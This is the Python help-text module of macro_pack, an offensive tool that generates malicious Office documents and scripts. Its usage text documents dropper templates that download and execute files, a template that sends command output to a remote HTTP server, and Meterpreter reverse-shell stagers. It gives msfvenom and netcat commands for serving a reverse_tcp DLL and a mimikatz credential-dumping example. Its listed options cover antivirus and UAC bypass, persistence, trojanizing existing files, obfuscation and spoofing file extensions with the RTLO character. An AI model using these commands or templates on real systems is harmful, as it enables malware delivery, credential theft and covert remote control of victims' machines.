#!/usr/bin/python3
# encoding: utf-8

from termcolor import colored


def printTemplatesUsage(banner, currentApp):
    print(colored(banner, 'green'))
    templatesInfo = \
r"""
      == Template usage ==

    Templates can be called using  -t, --template=TEMPLATE_NAME combined with other options.
    Available templates:

                --------------------

        HELLO
        Just print a hello message
        Give this template the name of the user
          -> Example: echo "@Author" | %s -t HELLO -G hello.pptm

                        --------------------

        CMD
        Execute a command
        Give this template a command line
          -> Example:  echo "calc.exe" | %s -t CMD -o -G cmd.xsl

                --------------------

        REMOTE_CMD
        Execute a command line and send result to remote http server
        Give this template the server url and the command to run
          -> Example:  echo "http://192.168.0.5:7777" "dir /Q C:" | %s -t REMOTE_CMD -o -G cmd.doc

                --------------------

        DROPPER
        Download and execute a file
        Give this template the file url and the target file path
          -> Example:  echo <file_to_drop_url> "<download_path>" | %s -t DROPPER -o -G dropper.xls

                --------------------

        DROPPER2
        Download and execute a file. File attributes are also set to system, read-only, and hidden
        Give this template the file url and the target file path
          -> Example:  echo <file_to_drop_url> "<download_path>" | %s -t DROPPER2 -o -G dropper.xlsm

                --------------------

        DROPPER_PS
        Download and execute Powershell script using rundll32 (to bypass blocked powershell.exe)
        Note: This payload will download PowerShdll from Github.
        Give this template the url of the powershell script you want to run
         -> Example:  echo "<powershell_script_url>" | %s -t DROPPER_PS -o -G powpow.doc

                --------------------

        DROPPER_DLL
        Download a DLL with another extension and run it using Office VBA
          -> Example, load meterpreter DLL using Office:

        REM Generate meterpreter dll payload
        msfvenom.bat  -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f dll -o meter.dll
        REM Make it available on webserver, ex using netcat on port 6666
        { echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat meter.dll; } | nc -l -p 6666 -q1
        REM Create Office file which will download DLL and call it
        REM The DLL URL is http://192.168.0.5:6666/normal.html and it will be saved as .asd file
        echo "http://192.168.0.5:6666/normal.html" Run | %s -t DROPPER_DLL -o -G meterdll.xls

                --------------------

        METERPRETER
        Meterpreter reverse TCP template using MacroMeter by Cn33liz.
        This template is CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw
        Give this template the IP and PORT of listening mfsconsole
         -> Example: echo <ip> <port> | %s -t METERPRETER -o -G meter.docm

        This template also generates a  meterpreter.rc file to create the Metasploit handler
          -> Example: msfconsole -r meterpreter.rc

                        --------------------

        WEBMETER
        Meterpreter reverse https template using VbsMeter by Cn33liz.
        This template is CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw
        Give this template the IP and PORT of listening mfsconsole
         -> Example: echo <ip> 443 | %s -t WEBMETER -o -G meter.sct

        This template also generates a  webmeter.rc file to create the Metasploit handler
         -> Example: msfconsole -r webmeter.rc

                --------------------

        EMBED_EXE
        Combine with --embed option, it will drop and execute (hidden) the embedded file.
        Optionaly you can give to the template the path where file should be extracted
        If extraction path is not given, file will be extracted with random name in current path.
         -> Example1:  %s  -t EMBED_EXE --embed=%%windir%%\system32\calc.exe -o -G my_calc.vbs
         -> Example2: echo "path\\to\newcalc.exe" | %s -t EMBED_EXE --embed=%%windir%%\system32\calc.exe -o -G my_calc.doc

                --------------------

        EMBED_DLL
        Combine with --embed option, it will drop and call a function in the given DLL
        Give this template the name and parameters of function to call in DLL
        -> Example1 : echo "main" | %s -t EMBED_DLL --embed=cmd.dll -o -G cmd.doc
        -> Example2 : echo "main log privilege::debug sekurlsa::logonpasswords exit" | %s -t EMBED_DLL --embed=mimikatz.dll -o -G mimidropper.hta

                --------------------
""" % (currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp, currentApp,currentApp,currentApp,currentApp, currentApp)
    print(templatesInfo)



def printUsage(banner, currentApp, mpSession):
    print(colored(banner, 'green'))
    print(" Usage 1: %s  -f input_file_path [options] " % currentApp)
    print(" Usage 2: cat input_file_path | %s [options] " %currentApp)
    proDetails = ""
    if mpSession.mpType == "Pro":
        proDetails = \
"""
    -b, --background    Run the macro in background (in another instance of office application)
    --vbom-encode   Use VBA self encoding to bypass antimalware detection and enable VBOM access (will exploit VBOM self activation vuln).
                  --start-function option may be needed.
    --av-bypass  Use various tricks  efficient to bypass most av (combine with -o for best result)
    --keep-alive    Use with --vbom-encode option. Ensure new app instance will stay alive even when macro has finished
    --persist       Use with --vbom-encode option. Macro will automatically be persisted in application startup path
        (works with Excel documents only). The macro will be then be executed anytime an Excel document is opened.
    -T, --trojan=OUTPUT_FILE_PATH   Inject macro in an existing MS office file.
        Supported files are the same as for the -G option
        If file does not exist, it will be created (like -G option)
    --stealth      Anti-debug and hiding features
    --dcom=REMOTE_FILE_PATH Open remote document using DCOM for pivot/remote exec if psexec not possible for example.
        This will trigger AutoOpen/Workbook_Open automatically.
        If no auto start function, use --start-function option to indicate which macro to run.
"""

    details = \
"""
 All options:
    -f, --input-file=INPUT_FILE_PATH A VBA macro file or file containing params for --template option
        If no input file is provided, input must be passed via stdin (using a pipe).

    -q, --quiet \tDo not display anything on screen, just process request.

    -p, --print \tDisplay result file on stdout (will display VBA for Office formats)
        Combine this option with -q option to pipe result into another program
        ex: cat input_file.vba | %s -o -G obfuscated.vba -q -p | another_app

    -o, --obfuscate \tSame as '--obfuscate-form --obfuscate-names --obfuscate-strings'
    --obfuscate-form\tModify readability by removing all spaces and comments in VBA
    --obfuscate-strings\tRandomly split strings and encode them
    --obfuscate-names \tChange functions, variables, and constants names

    -s, --start-function=START_FUNCTION   Entry point of macro file
        Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function

    -t, --template=TEMPLATE_NAME    Use VBA template already included in %s.
        Available templates are: HELLO, CMD, REMOTE_CMD, DROPPER, DROPPER2, DROPPER_PS, DROPPER_DLL, METERPRETER, WEBMETER, EMBED_EXE, EMBED_DLL
        Help for template usage: %s -t help

    -G, --generate=OUTPUT_FILE_PATH. Generates a file. Will guess the format based on extension.
        Supported Ms Office extensions are: doc, docm, docx, dotm, xls, xlsm, xslx, xltm, pptm, potm, vsd, vsdm, accdb, mdb, mpp.
        Note: Ms Office file generation requires Windows OS with right MS Office application installed.
        Supported Visual Basic scripts extensions are: vba, vbs, wsf, wsc, sct, hta, xsl.
        Supported shortcuts/shell extensions are: lnk, scf, url, glk, settingcontent-ms, library-ms, inf, iqy.

    -e, --embed=EMBEDDED_FILE_PATH Will embed the given file in the body of the generated document.
         Use with EMBED_EXE template to auto drop and exec the file or with EMBED_DLL to drop/load the embedded dll.

    --dde  Dynamic Data Exchange attack mode. Input will be inserted as a cmd command and executed via DDE
         DDE attack mode is not compatible with VBA Macro related options.
         Usage: echo calc.exe | %s --dde -G DDE.docx
         Note: This option requires Windows OS with genuine MS Office installed.

    --run=FILE_PATH Open document using COM to run macro. Can be useful to bypass whitelisting situations.
           This will trigger AutoOpen/Workbook_Open automatically.
           If no auto start function, use --start-function option to indicate which macro to run.
           This option is only compatible with Ms Office formats.

    --uac-bypass Execute payload with high privileges if user is admin. Compatible with next templates: CMD, DROPPER, DROPPER2, DROPPER_PS, EMBED_EXE

    --unicode-rtlo=SPOOF_EXTENSION Inject the unicode U+202E char (Right-To-Left Override) to spoof the file extension when view in explorers.
            Ex. To generate an hta file with spoofed jpg extension use options: -G something.hta --unicode-rtlo=jpg
            In this case, windows or linux explorers will show the file named as: somethingath.jpg


    -l, --listen=ROOT_PATH\tOpen an HTTP server from ROOT_PATH listening on default port 80.

    -w, --webdav-listen=ROOT_PATH \tOpen a WebDAV server on default port 80, giving access to ROOT_PATH.
    
    --port=PORT \tSpecify the listening port for HTTP and WebDAV servers.

""" % (currentApp,currentApp, currentApp, currentApp)

    details +=proDetails
    details +="    -h, --help   Displays help and exit"
    details += \
"""

 Notes:
    Have a look at README.md file for more details and usage!
    Home: www.github.com/sevagas && blog.sevagas.com

"""
    print(details)